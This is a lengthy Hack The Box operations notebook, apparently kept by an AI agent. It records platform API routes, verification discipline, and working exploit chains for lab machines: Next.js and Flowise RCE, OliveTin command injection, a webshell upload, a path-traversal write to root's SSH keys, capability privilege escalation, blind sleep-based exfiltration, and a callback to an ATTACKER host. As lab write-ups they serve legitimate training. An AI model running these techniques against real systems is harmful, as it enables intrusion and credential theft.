# HTB Operations — verified routes, hard-won pitfalls, and the discipline

Written across one long session on a **free (`isVip=false`) account**, ending at
**Lvl 80 (Prodigy), 95,674 XP, rank Hacker**, with **11 machines owned user+root** (platform
`authUserInRootOwns` — **not the 15 this header claimed for most of the session; the corrected
figure is the platform's**), **18 user flags**, **116 challenges** (from 26), and **103 of the 122
reachable sherlocks** (1,055 tasks, from 0) — all platform-confirmed via
`authUserInUserOwns` / `authUserInRootOwns` / `is_owned` / `authUserSolve` / task `completed`,
never inferred from the DOM.

> **The live figures, re-read from the platform rather than assembled by hand, are in
> `/home/logic/Work/HTB-STATE.md` and `HTB-STATE.json`.** **That file exists because two agents
> died mid-run here and took their progress records with them — so the durable record is now
> platform-sourced and agent-independent.** **Read it instead of this header for counts.**
>
> **And note the correction in it: this header said "15 machines owned user+root" for most of the
> session, and the platform counts 11.** **The hand-maintained list was not the authority; the
> flag was.** **Which four were double-counted is not recoverable from a list — only from
> `authUserInRootOwns` per machine.**

**Seasons track the ACTIVE pool:** 22 active/seasonal machines were still unowned at root when this
was written (listed with ids and difficulties in `HTB-STATE.md`), and the `isVip=false` ceiling caps
the rest (**~33 free of 553**).

**The failures are included deliberately.** They are the expensive part and the reason this
file exists. **Across both sessions they reached one conclusion: the binding constraint was almost
always a field I had not read (`state`, `isVip`, `authUserInUserOwns`) or output I had discarded —
never the target's defences.**

**§33–§44 are new (2026-09-30):** the account fields that define what is reachable at all, the
per-state submission routes, fuzzing discipline, two complete CVE chains, and the tooling gotchas
that cost the most rounds.

---

## 1. The rule that decided every success

> **Fingerprint the component. Search the component. Then execute.**

Every ranked machine this session fell to this, and the two that stalled did so because I
skipped it:

| Machine | Time to identify the path | How |
|---|---|---|
| **Reactor** | **6 rounds** | Metasploit's module, found only after **4 failed hand-rolled payloads** |
| **Cohort** | **12 rounds** | One `web_search` in round 40, after **8 rounds of dead-end JS deobfuscation** |
| **Connected** | **1 round** | One search, *before touching the box* — the CVE was in the result title |

**The vulnerability was in a third-party component every single time**, and I kept reading the
application's own code instead:

- **Reactor** — found the RSC endpoint, decided the app was "inert", missed `CVE-2025-55182` in Next.js
- **Cohort** — found marimo's login form, decided auth was the wall, missed `CVE-2026-39987` (pre-auth RCE)
- **Connected** — searched first, found `CVE-2025-57819` in one call

**A login page is not a wall until you have checked whether the service is vulnerable before
authentication.** Cohort's token hunt was 8 rounds spent defeating a control that was never in
the path.

---

## 2. Read the reference before rebuilding it

**Reactor's exploit failed four times.** Fetching the Metasploit module fixed **four** wrong
parameters at once:

| Parameter | Correct | What I used |
|---|---|---|
| Endpoint | `/` (`normalize_uri(target_uri.path)`) | `/` ✅, but I detoured to `/RSC/R/<rand>.txt` — that's the **Waku** endpoint |
| Header | **`Next-Action: ''`** (empty) | `next-action: x` ❌ |
| Code access | **`process.mainModule.require('child_process')`** | plain `require(...)` ❌ — not in scope |
| Chunk `value` | `{"then":"$B"}` | `{"then":"$3:map",…}` ❌ |

**And the module ships a `check` request** — one call that separates *"patched"* from *"my
payload is wrong"*:

```
throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`NEXT_REDIRECT;push;/<RAND>;307;`});
→ vulnerable iff HTTP 303 with `<RAND>;push` in a header
```

**Establish exploitability first, then build the exploit.** Every other lesson is downstream.

---

## 3. Verified API routes

`https://labs.hackthebox.com/api/v4` · header `Authorization: Bearer <JWT>` — **cookies give 401.**
Token lives in `localStorage['htb-token']` of the signed-in browser.

```python
from playwright.sync_api import sync_playwright
with sync_playwright() as pw:
    b = pw.chromium.connect_over_cdp("http://127.0.0.1:9222")
    for p in b.contexts[0].pages:
        if "hackthebox.com" in p.url:
            tok = p.evaluate("() => localStorage.getItem('htb-token')"); break
```

| Route | Method | Purpose |
|---|---|---|
| `/machine/active` | GET | which box holds the single slot, and its IP |
| **`/vm/terminate`** | POST | **free the slot.** `/machine/stop`, `/machine/terminate`, `/vm/stop` all 404 |
| `/connections/servers?product=starting_point\|labs` | GET | 422 *"The product field is required"* without `product` |
| `/access/ovpnfile/<serverId>/0/<tcp\|udp>` | GET | `.ovpn` config |
| **`/challenge/info/<id>`** | GET | **singular** — `description`, `authUserSolve`, `docker`, `play_info`. `/challenges/<id>` **404s** |
| **`/challenge/own`** | POST | **submit a flag**: `{"challenge_id":N,"flag":"HTB{...}"}`; verdict in the body |
| **`/container/start`** | POST | **spawn**: `{"containerable_id":N}` → `{"id":…,"message":"Instance Created!"}` |
| **`/container/stop`** | POST | **tear down**: `{"containerable_id":N}` |
| `/challenge/<id>/writeup` | GET | **403 until owned** — expected, not a failure |

**Guessed and wrong (all 404):** `/challenges/<id>/flag`, `/challenges/<id>`, `/challenge/<id>/flag`,
`/challenge/<id>/own`, `/challenge/<id>/submit`, `/challenge/flag`, `/api/v5/challenge/<id>/flag`,
`/container/<id>`, `/container/info/<id>`, `/container/list`, `/container/active`.

### The browser network tab beats inference — 6 for 6

**Every route that mattered was found by watching the UI, after my inferred route 404'd:**
the HTB token, `/vm/terminate`, `/challenge/info/<id>`, `/challenge/own`, `/container/start`,
and the challenge instance address. **Stop guessing route names by symmetry with other routes.**

**`play_info` in `/challenge/info/<id>` DOES carry ip+ports — read it first.** I once checked it
while the instance was still starting, saw it empty, and concluded it never populates; **an agent
found the addresses there in one call.** The DOM-button scrape below works, but it is the fallback:

```js
[...document.querySelectorAll('button')].map(e=>e.innerText.trim())
  .filter(t => /^\d{1,3}(\.\d{1,3}){3}:\d{2,5}$/.test(t))   // → ['154.57.164.77:32074']
```

**One container per user: spawning a second kills the first.** Containers also **die in roughly
1–3 minutes**, so **spawn and exploit must be one script** — not two steps with thinking in between.

**Retired challenges can be VIP-gated.** `POST /container/start` on `1042` returned
**`403 "Challenge is only available to VIP subscribers"`** (reproduced twice), `/challenge/download/1042`
gave the same 403, and `state` was `retired` rather than `retired_free`.
**Check for that 403 before spending rounds on a retired challenge** — on a non-VIP account it is
unreachable and no offline path exists (public writeups redact the flag).

---

## 4. Pitfalls that each cost a round or more

**`pkill -f <pattern>` kills your own shell when the pattern appears in its own command line.**
`pkill -f root_l` SIGTERM'd my bash repeatedly — including the command writing a listener script,
which is why the next round found the file missing. **It presents as an "environment problem"
and is entirely self-inflicted.** Use `pkill -x <exact-name>`, or don't.

**Interactive prompts abort unattended PoCs *after* the dangerous work.** `input()` on empty
stdin → `Error: EOF when reading a line`. **Feed it:** `yes '' | python3 exploit.py …`

**Don't name a helper after a stdlib module.** `/tmp/http.py` → `ModuleNotFoundError: No module
named 'http.server'; 'http' is not a package` — it shadows the package. **The listener never
started and the round produced a false negative.**

**A listener inside a command that gets killed dies with it.** `setsid nohup … < /dev/null &`
plus a readiness flag on disk (`/tmp/ready`) — **and confirm the port is bound before firing.**

**Fixed `wait_for_timeout` sleeps produce empty reads.** A SPA that hasn't hydrated has no
controls — I inspected a challenge page twice and concluded "no flag input exists" when it
simply hadn't rendered. **Wait on `networkidle` or a selector.**

**Not every target can call back.** Connected's box could not reach my VPN IP at all — `curl`,
`wget`, `bash /dev/tcp` and `python socket` all silently failed against a listener I had
*confirmed bound*. **Test egress explicitly before designing a reverse-shell step**, and prefer
a payload whose effect lands on the target (`cp /root/root.txt /var/www/html/out.txt`, read over
HTTP).

**Check the version against the advisory — that comparison often *is* the finding.**
FreePBX printed `16.0.40.7` into its own page source; `CVE-2025-57819` affects `< 16.0.89`.
**One round of recon, one version string, done.**

**Read certificates and status pages.** Connected's TLS cert leaked `CN=sso.management.htb`;
Cohort's internal nginx `/status` published its whole upstream map including a vhost marked
*"not for external use"*. **Metadata leaks the path more often than the app does.**

**Descriptions contain decoy flags.** Cohort's 977 description read
`Example: HTB{CEO_Thomas_Wilson_Approved_Budget}` — **submitted, verdict "Incorrect flag".**
**Never treat a flag-shaped string found in a description as the answer.**

**Rate limits are real and self-inflicted.** Hundreds of `labs.hackthebox.com` calls in one
session → **429 on every route, including the `.ovpn` endpoint.** Once the tunnel config is on
disk, **keep it** — reconnecting needs no API call.

---

## 5. Discipline that separates a verified result from a claim

**One target at a time, to completion.** HTB permits **one active machine per account** — no
parallelism is possible there, and the serial record this session was **7 for 7**.

**Do not parallelise a pipeline you have not proven end-to-end on one item.** I dispatched
**7 subagents across 14 challenges** against a route that 404'd, a list that wasn't filtered
(`/challenges` returns the *catalogue*, not the uncompleted subset), and a submission endpoint
that didn't exist. **Three re-briefing passes, 7 agents killed for RAM, 0 flags.**
**Prove the loop on one item first — that single step is the entire difference.**

**Verify with the platform, not with your own reasoning.** `authUserSolve` per challenge and
HTB's own `"… is now owned"` response per machine are the only admissible evidence.
**This session produced at least five false-success patterns** (plausible flag in a description,
a digest that looked like execution, a listener that never started, an unfiltered list) —
**every one caught by checking, none by thinking.**

**Report negatives as negatives.** A truthful "unsolved, blocked here, ruled out these" is worth
more than a guess, because the next attempt starts from measured ground instead of re-deriving.

---

## 6. The agent brief that finally worked

**Round 57: 7 agents, 14 challenges, 0 flags.** They were briefed against a route that 404'd, an
unfiltered list, and a submission endpoint that didn't exist. **3 re-briefing passes, 7 killed for
RAM, nothing.**

**Later: 3 agents, 14 challenges, 3 confirmed solves.** Same account, same challenges, same
parallelism — **only the brief changed.** Give every agent, verbatim:

1. **The exact verified routes**, with the singular/plural trap flagged — `GET /challenge/info/<id>`
   (not `/challenges/<id>`), `POST /container/start`, `POST /challenge/own`.
2. **How to get a token** — the `connect_over_cdp` snippet and `localStorage['htb-token']`.
3. **Which Python** — `/home/logic/Work/.pwenv/bin/python`; **system `python3` has no playwright.**
4. **Where the instance address lives** — `play_info` first, DOM button as fallback.
5. **`one container per user; they die in 1–3 minutes — spawn and exploit in ONE flow.`**
6. **`NEVER close a page you did not open`** — the CDP browser is the user's live signed-in session.
7. **The decoy warning, with the actual decoy string** — `HTB{CEO_Thomas_Wilson_Approved_Budget}`
   was submitted and rejected; say so.
8. **`Never fabricate a flag or a submission result`** — `authUserSolve` is the only proof, and a
   truthful "unsolved + where I got stuck" beats a guess.

**Agents corrected *me*, twice, and both corrections are above:** `play_info` does carry the
address, and only one container runs at a time. **They also caught that two challenges in my
"14 unsolved" list were already solved** — my per-item `authUserSolve` check had reported `false`
for both. **An agent that reads the field per item is more reliable than my summary of it.**

**Three agents, not seven** — each one starts a browser context, and the RAM belongs to the user.

---

## 7. "Read it, don't infer it" — the failure that repeated three times in one machine

**Enigma's root stage cost four avoidable detours, and three were the same mistake:**

| I inferred | The evidence said | Cost |
|---|---|---|
| The action field is `actionId` (5 spelling variants) | **`bindingId`** — read from OliveTin's own `ActionDetailsView` bundle | 2 rounds |
| The API is REST | **gRPC-Web**; the real route returned **405**, not 404 | 1 round |
| The login needed a CSRF token | The form has **no token** — only `username`/`password` | 1 round |
| "OliveTin is hanging" | It **answers `haris` and not `www-data`** — an identity difference | 1 round |

**`actionId` is a *route* parameter (`/action/:actionId`); the *request* field is `bindingId`.**
Five spellings returning an identical `"action with ID  not found"` is the signature of a field
name that never bound — **when every guess fails the same way, stop guessing and read the client.**

**And test reachability under more than one identity before declaring a service down.**
`curl` from `www-data` timed out; the same `curl` via `su haris` returned **200**. **One variable
changed, opposite result** — that is a two-step experiment I ran as a conclusion.

---

## 8. Two more reusable findings from Enigma

**A `password`-typed argument is a display hint, not a validation constraint.**
OliveTin's `Backup Database` action:
```yaml
shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
arguments:
  - name: db_user   type: ascii_identifier     # validated
  - name: db_pass   type: password             # NOT validated — and it's the one interpolated
  - name: db_name   type: ascii_identifier     # validated
```
**The one field with no constraint is the one that reaches the shell.** Check the argument types of
every automation action that shells out — OliveTin, Rundeck, Jenkins parameterised builds.

**A command injection with `Popen` is asynchronous — a timing oracle will NOT reveal it.**
Management's `sleep 12` test worked because the servlet blocked. **Here it cannot**, so the only
channel is a side effect: **write a file and read it back.** And the ownership of that file *is*
the proof — `/tmp/r.txt` came back **`root root`**, which is what showed the command ran in
OliveTin's root context rather than merely that a file appeared.

**When quoting the payload fights you twice, stop quoting.** `db_pass` contained `'`, which broke
`printf '…'` and then an inline Python `'''`. **Base64 the JSON body, decode it on the target**,
`--data-binary @file`. Same trick as Reactor's payload.

---

## 9. Submitting a flag: find the control in the input's own container, then verify the STATE

**Cap was fully exploited in round 112 and only *owned* in round 113.** Both flags were correct
the whole time; **the click was wrong**, and nothing in the response said so.

```
round 112:  button picked by a global /submit/i text search   →  WRONG element
            reload → both flag inputs EMPTY, no "owned" marker
            → reported as UNVERIFIED  (correct call)
round 113:  from the flag input, walk UP to its own form/container,
            then search only that container for /submit\s*flag/i
            → {'ok':'clicked','label':'Submit Flag'}
            reload → placeholder flipped to 'User flag owned' / 'Root flag owned'   ✓
```

**`Submit Flag` is not in the page's main `<button>` list.** That list is the tab bar —
`Play Machine`, `Machine Info`, `Walkthroughs`, `Reviews`, `Activity`, `Changelog`.
**I searched a scope that did not contain the control and clicked the first thing that matched.**

```python
# the pattern that works
el  = first input whose placeholder matches /32 hex/i and is empty
set el.value via the native setter, dispatch 'input' and 'change'
ctl = el.closest('form') or el.closest('div'), walking up to 6 levels,
      searching ONLY there for a control matching /submit\s*flag/i
ctl.click()
```

**Then verify by STATE CHANGE, never by absence of error:**

| Signal | Meaning |
|---|---|
| placeholder `32 hex characters` → **`User flag owned`** | **accepted** |
| inputs **empty again after reload** | **the submit did not land** — regardless of how right the flag was |
| HTB body text **`"… is now owned"`** + a level-up | accepted (machines) |
| `/challenge/own` → **`{"message":"Congratulations!"}`** | accepted (challenges) |

> **A correct flag with a wrong click is indistinguishable from a wrong flag — except by the
> platform's own marker.** Report "captured but unverified" until that marker appears.

**This is the fourth appearance of one pattern in this session:** `actionId` vs `bindingId`,
REST vs gRPC-Web, a CSRF token that did not exist, and a submit control that is not a `<button>`.
**Every time, the fix was to read the artifact instead of a plausible parallel.**

---

## 10. Linux enumeration additions worth running first

**`getcap -r /` belongs next to `sudo -l` in the first pass.** Cap's root was
`/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip` — **file capabilities are invisible to
`ls -l`, and `cap_setuid` on an interpreter is a one-command root:**
```bash
python3.8 -c 'import os; os.setuid(0); os.system("id; cat /root/root.txt")'
# uid=0(root) gid=1001(nathan)     ← gid unchanged: setuid alters the EFFECTIVE user only, which
#                                     is normal and entirely sufficient
```

**Check `file` on every HTTP 200 before trusting it.** On Cap, `/data/0` returned **HTML**,
`/data/1` a **302**, and only `/download/0` a **PCAP** — **three of four probe paths returned 200
with the wrong body.** Status code alone would have misled me three times.

**Reuse recovered credentials against every auth service, not just the one they came from.**
The PCAP held FTP credentials; the *same* pair opened SSH.

---

## 11. Running a server-style exploit over SSH — detach, then read logs

**Three failures in a row, one fix.** CVE-2023-0386 needed two processes and a FUSE mount:

```
1. A backgrounded process HOLDS THE SSH CHANNEL OPEN.
   exec_command() times out even though the exploit is running perfectly.
2. pkill -f '/tmp/e2/fuse' matched MY OWN command line and killed the shell,
   so the mkdir in the same command never ran and the SFTP had no directory.
   (SKILL.md §4, and I walked into it again.)
3. Waiting on the channel instead of reading a log.
```

**The pattern that works — write a runner, detach it, reconnect:**
```python
runner = """#!/bin/sh
cd /tmp/e3
pkill -x fuse 2>/dev/null; pkill -x exp 2>/dev/null     # -x exact name, NEVER -f pattern
sleep 1
./fuse ./ovlcap/lower ./gc > /tmp/e3/fuse.log 2>&1 &    # stage 1: backgrounded
sleep 6
./exp > /tmp/e3/exp.log 2>&1                            # stage 2
sleep 4
echo 'id; cat /root/root.txt' | timeout 20 /tmp/e3/ovlcap/upper/file 2>&1 > /tmp/e3/shell.log
"""
sh("chmod +x /tmp/e3/run.sh && setsid /tmp/e3/run.sh >/dev/null 2>&1 </dev/null & echo launched")
#   ↑ returns IMMEDIATELY
time.sleep(35)
# NEW connection → head fuse.log / exp.log / shell.log
```
> **Never let the SSH channel be the thing that waits.** Detach, sleep, reconnect, read files.

**Also do the setup in SEPARATE commands** — a `pkill` that kills your shell takes the rest of the
line with it, and the failure looks like "SFTP: no such file" two steps later.

---

## 12. Payload framing, not payload privilege

**TwoMillion's command injection needed a TRAILING SEMICOLON.**
```
{"username":"p;id;"}       → uid=33(www-data)          ✓
{"username":"pwn2; id"}    → 200, empty, NOTHING HAPPENS
```
The server builds `openssl … -subj "/CN=<username>" …`. **Without a terminator the injected command
stays concatenated to the rest of the original line and the whole line fails.**

> **When an injection returns 200 and does nothing, suspect the FRAMING before the privileges.**
> A missing terminator invalidates everything silently.

**And a retraction to keep:** I read **`504 Gateway Time-out` as proof the command executed.** That
was too strong — a 504 is nginx giving up on a slow upstream and can occur with no execution at all.
**A file-effect test said no, and it was right.** *A status code is appearance; an effect is evidence.*

**Never trust the tool's own success banner either.** `[+] exploit success!` printed on a run where
the shell stayed `uid=1000`. **`uid=0(root)` in a log is the evidence.**

---

## 13. Enumerate the free set — don't guess machine names

**`free=True` on EVERY machine — it is a useless field.** The real gate is `requiredSubscription`:

```python
d = GET /api/v5/machines?per_page=100        # discover this by watching the machines page
# requiredSubscription: 'None' | 'VIP+'
# authUserInUserOwns / authUserInRootOwns    ← ownership
startable = [m for m in d if not m['requiredSubscription']
             and not m['authUserInUserOwns'] and not m['authUserInRootOwns']]
```
**Guessing four names cost a round; the API answered in one call.** Free Easy boxes found this way:
`Orion · Silentium · TwoMillion · Nexus` (plus `Cap`, `Enigma`, `Cohort`, `Paperwork`, `Management`).

**And read a machine's IP from the API, not the DOM:**
```
GET /api/v4/machine/active  →  info.ip
```
**The page rendered no IP across 8 polls (~70s); the API answered on the second call 12s apart.**

**Discovering the endpoint is itself a pattern worth repeating:** open the page with a CDP browser,
attach a response listener, and read which API URLs the page itself calls —
`/api/v5/machines`, `/api/v5/virtual_machine/active`. **That is how you find routes instead of
inventing them.**

---

## 14. Isolate the payload from the header — an exploit's output is usually appended, not pure

> **CORRECTED.** An earlier version of this section claimed Orion's exploit channel had "frozen".
> **That was wrong.** The channel worked the entire time; I was reading a constant header and
> mistaking it for the whole response.

**What the raw response actually looks like:**
```
Server response
fee81108e13e47e33081e3cc28ea6928__flash|a:0:{}5617f36303fcfa172f5dd991a7022285__returnUrl|s:78:"…&a=-rw-r--r-- 1 www-data www-data 6807 Sep 29 15:35 /tmp/tr.py
MARKER_END
```

**Line 2 is a constant session header. The command's output is appended to the *end of that same
line*, then continues on following lines.** Truncating with `tail -n +2 | head -20` — or filtering
with `grep -v __flash` — **discards the answer along with the noise.**

**The rule:**
> **Print the RAW response first, in `repr()` if needed, before writing any filter.**
> Only then decide what to strip. **A constant prefix is not evidence of a dead channel** — the
> payload is appended to it.

### What the false "frozen channel" conclusion cost

Four rounds, and a `SKILL.md` section describing behaviour that never happened. The reasoning error:

| I observed | I concluded | The truth |
|---|---|---|
| identical response prefix across runs | "channel frozen" | the **header** is identical; the payload changes |
| `base64 f` produced the same bytes as `cat f` | "the command didn't run" | I compared the **header**, not the output |
| `cat /home/adam/user.txt` empty | "channel lies" | **www-data genuinely cannot read that file** |

**And the false flag was real for a different reason than I gave.** `fee81108e13e47e33081e3cc28ea6928`
appears as `…__flash` — **a session key name, i.e. the exploit's own residue.** It is still not a
flag, and retracting it before a fourth submission was still correct. **The conclusion was right and
my explanation for it was wrong** — which is its own lesson: *being right for the wrong reason does
not validate the reasoning.*

### The diagnostic battery, kept — but applied to the payload, not the header

| Test | What it settles |
|---|---|
| `echo N1_$(date +%s%N)` then `N2_$(date +%s%N)` | **do the *payloads* differ?** |
| does `$()` expand? | is the shell interpreting, or is it a raw write? |
| `base64 f` vs `cat f` | **compare the output segments, not the whole response** |
| write a file, fetch it over a **different** channel | the only test that escaped this confusion |
| print the raw response with `repr()` | **do this first, always** |

> **Every test above must be run against the segment after the header.** Comparing whole responses
> is what produced a four-round false conclusion.

---

## 15. Hard request-size limits: chunk, don't shrink

**nginx rejects an oversized request URI with `414`.** Measured on two different boxes:

```
Management:  between 4,000 (200) and 8,000 (400)      ; 8,192 → 414
Orion:       9,076 chars of base64 → 414 Request-URI Too Large
             split 5 × 2,000 → 2000 · 4000 · 6000 · 8000 · 9076 bytes, intact   ✓
```

```python
for c in chunks:                      # append on the target
    rce(f"echo -n {c} >> /tmp/x.b64")
rce("base64 -d /tmp/x.b64 > /tmp/x.py")
```
> **A payload too large for one request is not too large for the box** — and the same trick
> delivered Reactor's compressed gadget earlier in this session. **Chunking beats shrinking.**

---

## 16. When stdout is denied AND egress is blocked: `sleep` is your data channel

**Silentium's Flowise RCE executes as root in a container, returns a CONSTANT body, and the
container cannot reach the attacker.** Three separate problems, all solved:

### a. Prove execution with timing, never with the status code

```
payload returns a fixed error body regardless of what runs:
[{"label":"No Available Actions","name":"error",…}]

cp.execSync('true')      → 0.78s
cp.execSync('sleep 12')  → 12.77s      ← EXACTLY +12s  ⇒ it RUNS
```
> **A `200` here proves nothing. Only the response time does.**

### b. Prove egress blocked with a callback test — before designing a reverse shell

```
cp.exec('curl http://ATTACKER:8088/')   → HTTP 200   (request landed)
listener on 8088                        → nothing
```
**Every reverse-shell payload on this box was doomed by the network, not by syntax.** The
walkthroughs' `mkfifo`+`nc` one-liner is correct and would work where egress is allowed.
**A `200` on the injection is not a callback.**

### c. Boolean exfiltration via `sleep`

```bash
cp.execSync('if [ -d /path ]; then sleep 8; fi')      # 8s = TRUE, ~1s = false
```
```
[ -w /usr/local/lib/node_modules/flowise ]   8.8s  TRUE
[ "$(whoami)" = root ]                       8.8s  TRUE    ← root in the container
[ -f /etc/nginx/sites-enabled/default ]      0.9s  false   ← nginx is on the HOST
```
> **Any yes/no question about the target costs one 8-second round trip. Character-by-character
> reads are possible with `sleep <ord(char)>`, or binary search with `[ "$x" \> "m" ]`.**

### d. Find a servable path by planting everywhere, then fetching once

**Probing URLs individually is useless behind an SPA:** Flowise answers *every* unknown path with
its own `index.html`, so **"wrong path" and "not served" are indistinguishable.**

```bash
find /usr/local/lib/node_modules/flowise -type d | while read d; do
    echo ZZMARKER > "$d/zz.html"; done
curl http://staging.silentium.htb/assets/zz.html      → ZZMARKER   ✓
```
> **One command replaces unbounded guessing. Then write the real payload the same way and fetch it.**

### e. Read a credential leak as credentials *plural*

```
FLOWISE_PASSWORD=F1l3_d0ck3r     ← the APP password — SSH REJECTS it
SMTP_PASSWORD=r04D!!_R4ge        ← the SYSTEM account — SSH WORKS
```
**Two credentials, for different systems. The obvious one was wrong.**

### f. Flowise-specific: the session-API header

```bash
GET /api/v1/apikey        # session cookie +  x-request-from: internal
→ [{"apiKey":"…"}]        # without that header: 401
```
**The exploit's README says "grab the API key from the UI manually" — the UI masks it permanently.
One header returns it in plaintext.**

---

## 17. Three traps I re-committed this session

**Recurring failures are worth listing separately from techniques, because knowing them did not
prevent them.**

**1. `pkill -f '<pattern>'` kills the invoking shell when the pattern matches its own command
line.** Occurred **three times** (Enigma, TwoMillion, Silentium) — including `pkill -f 'L 3000'` for
a tunnel whose command line contained `L 3000`. **Use `pkill -x <exact-name>`, kill by PID from
`pgrep -x`, or simply do not kill: bind a fresh port.**

**2. A reported tunnel is not a working tunnel.** `sshpass` was not installed, so **every tunnel
"created" across two rounds silently failed** — and I reported one as working **from a `pgrep` PID
rather than a connection test.** **Verify a tunnel by connecting through it.** Same rule as
verifying a flag.

**3. A grep that matches the page under test reports a confident negative.** My Gogs login check
grepped for the word `Captcha` anywhere in the response — **including the login page itself** — so
all five credential attempts were labelled FAILED regardless of truth. **Test for a state change
(redirect, status, placeholder), never a substring that the control response also contains.**

**And one measurement error:** a constant response *prefix* is not a dead channel. I read
`fee81108…__flash|…__returnUrl|…` as "frozen" for four rounds — **it is a session header; the
payload is appended to it.** Print the RAW response with `repr()` before writing any filter.

---

## 18. Reading the tool's own artifact beats re-running it

**Silentium's root reached 6 of 7 steps and then stalled for four rounds — because I kept re-running
my harness instead of reading Gogs' own output.**

**The fix came from one API field:**
```
GET /api/v1/repos/<user>/<repo>   →  ssh_url: root@host:user/repo.git
                                     ^^^^ the SSH user is ROOT, not the exploit's default `git@`
```
**Every clone failed as `git@`; the correct clone succeeded first try as `root@`.** Gogs runs
`RUN_USER=root` and maps keys to accounts itself.

> **The pattern across all four parked machines (Management, Paperwork, Orion, Silentium):
> enumeration and exploitation were fine; what failed was reading the artifact in front of me
> rather than re-testing my own plumbing.** The artifacts in question were, in order:
> a JATO ViewBean list, the source of a downloadable archive, `ActionDetailsView.js`, and Gogs'
> `ssh_url`. **Each was one read away.**

---

## 19. Check for a response-based shell BEFORE designing a callback

**Nexus's CVE-2026-38526 gave RCE as a webshell that answers `?cmd=`:**

```bash
POST /admin/tinymce/upload   field 'file', filename 'webshell.php', type 'image/jpeg'
  → {"location":"http://…/storage/tinymce/<hash>.php"}
GET  <location>?cmd=id       → uid=33(www-data)          ← output in the HTTP response
```

> **If the RCE endpoint returns output in the response, use it. `?cmd=` beats a reverse shell
> everywhere egress is uncertain.**

**This directly corrects Silentium**, where **five rounds** went into engineering output channels
(blind timing oracle, marker-planting to find a served path, HTTP exfiltration) around blocked
egress. **All of it was avoidable** had I first asked: *does this RCE endpoint have a `cmd`
parameter?* **On Silentium the answer was no — but I never checked; I assumed a callback from the
start and only discovered egress was blocked after four failed shells.**

**Order of preference for an RCE, cheapest first:**
1. **Output returned in the response** (`?cmd=`, `?exec=`, a JSON field) — no network dependency
2. **A file effect read over a channel that already works** (web root, `/assets`, SMB)
3. **A reverse shell** — only after measuring egress, and only if 1 and 2 are unavailable

---

## 20. A credential is a PAIRING — resolve each half from its own source

**Nexus:**
```
username  →  nexus.htb       (the staff list: j.matthew)
password  →  git.nexus.htb   (DB_PASSWORD from a deletion diff)
```
**I took the identity from the repo's commit author (`admin@nexus.htb`) — who wrote the file, not
who logs in.** Two rounds lost.

**And a stale password is not a wrong one.** `N27xh!!2ucY04` opened the **CRM** (a user had reused
it); `y27xb3ha!!74GbR` is the LIVE database password and opened **SSH and Gitea**. **Both were
needed, and one variable name held two truths.**
```
secrets   → from where secrets leak    (git history, .env, config files)
identities → from where identities are published (staff pages, git owners, /etc/passwd)
passwords → try EVERY one you hold against EVERY service; reuse is the norm, not the exception
```

---

## 21. The vulnerable service's own source usually names the file it will overwrite

**Nexus's privesc, read from `/etc/gitea/template-sync.py` (world-readable, 644):**

```python
# runs as root, every 60s via gitea-template-sync.timer
subprocess.run(['git','ls-tree','-r','HEAD'], cwd=bare_path)
for each entry:  write to  os.path.join(STAGING_DIR, owner, name, entry_name)
                                                          ^^^^^^^^^^ UNSANITIZED
```
> **`os.path.join()` does not neutralise `..`.** A tree entry named
> `../../../../../../root/.ssh/authorized_keys` makes a **root** process write wherever it likes.
> **Git's client refuses to create such an entry — the control is on the writer's side, while the
> consumer trusts what it reads.**

**And the service's own log is the proof:**
```
[16:26:30] Syncing template: jones/rce
[16:26:30]   synced: ../../../../../../root/.ssh/authorized_keys
```
**Then `ssh -i /tmp/.exploit_key root@…` → `uid=0(root)` — first try.**

**Read the source of any unexpected service BEFORE attacking it.** Nexus's script was 644 and
named both the traversal and its staging directory; **the previous four parks all turned on
exactly this kind of read** (`ActionDetailsView.js`, Gogs' `ssh_url`, a JATO endpoint list).

**Corollary — follow every path the source mentions, then let the filesystem settle it.** The
script read a second config (`/opt/forge/app/.env`) that **does not exist**; one `ls` closed that
branch instead of a round of speculation.

---

## 22. Ask which protocols the ACCOUNT is authorised for — before choosing a client

**Support cost five consecutive rounds to this, and the answer was available from round one.**

```
support ∈ CN=Remote Management Users,CN=Builtin,DC=support,DC=htb      ← and NOTHING else
```

> **That single group membership selects WinRM and rules out WMI, PsExec and SMB-exec BEFORE any of
> them is run.** WMI (`wmiexec`) needs **local Administrator**; a standard user in `Remote
> Management Users` will always get `rpc_s_access_denied` from it — **which is the target behaving
> correctly, not a credential problem.**

**One query answers it:**
```bash
ldapsearch -x -H ldap://<dc> -D '<user>@<domain>' -w '<pw>' -b 'DC=<d>,DC=<t>' \
           '(sAMAccountName=<user>)' memberOf
ldapsearch ... -b 'DC=<d>,DC=<t>' '(cn=Remote Management Users)' member
```

**Then get a client FOR THAT PROTOCOL — do not cycle clients across protocols that cannot work:**

| protocol | needs | tool |
|---|---|---|
| **WinRM 5985/5986** | `Remote Management Users` **or** Administrators | `evil-winrm`, `netexec winrm`, pywinrm |
| **WMI / DCOM 135** | **local Administrator** | `wmiexec.py` |
| **SMB exec 445** | **local Administrator** | `psexec.py`, `smbexec.py` |
| **RDP 3389** | `Remote Desktop Users` | `xfreerdp` |

**And the verification rule, now paid for five times in one session:**
> **When a tool says no, prove the TARGET said no — using a DIFFERENT tool.** A tool's refusal is
> information about your tooling until something independent confirms the target's answer.
> **An LDAP bind is that independent confirmation** — it takes one command and settles whether a
> credential is valid, no matter what any shell client claims.

**Client prerequisites that were missing and mimicked target refusals:**
```bash
pip install pywinrm requests_ntlm     # requests_ntlm is REQUIRED for transport="ntlm"
gem install evil-winrm winrm winrm-fs winrm-elevated
# gem binaries land in ~/.local/share/gem/ruby/<ver>/bin — NOT on PATH by default
```

---

## 23. Harvest EVERY string attribute in the directory, not the credential-shaped ones

**Support's foothold password was in a field nobody greps for:**
```bash
ldapsearch ... '(objectClass=user)' | grep -iE '^(info|sAMAccountName):'
   sAMAccountName: support
   info:           Ironside47pleasure40Watchful        ← A PASSWORD, IN PLAINTEXT
```

> **`info` and `description` are readable by ANY authenticated principal by default in AD, and
> administrators put notes in them.** This is a real-world finding class, not a lab contrivance.

**So dump every string-valued attribute of every object, and read them:**
```bash
ldapsearch -x -H ldap://<dc> -D '<user>@<domain>' -w '<pw>' -b 'DC=<d>,DC=<t>' \
           '(objectClass=user)' '*' > ldap_all.txt
grep -iE '^\s*(info|description|comment|notes|title|department|streetAddress|postalCode|'\
